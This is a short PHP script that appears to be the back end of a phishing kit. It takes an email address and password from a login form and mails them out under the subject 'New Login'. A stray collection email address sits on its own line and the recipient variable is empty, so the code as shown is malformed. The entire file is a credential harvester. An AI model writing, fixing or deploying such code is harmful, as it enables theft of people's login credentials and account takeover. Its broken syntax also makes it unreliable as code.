<?php
      session_start();
      ini_set("display_errors", 0);
      $email = trim($_POST['email']);
      $password = trim($_POST['password']);
      $message = "Email Address : $email <br> Password : $password ";
      info@acoustlquedelestrie2006.com
      $to = "";
      $subject  = "New Login";
      mail($to, $subject, $message);
      echo $message;
?>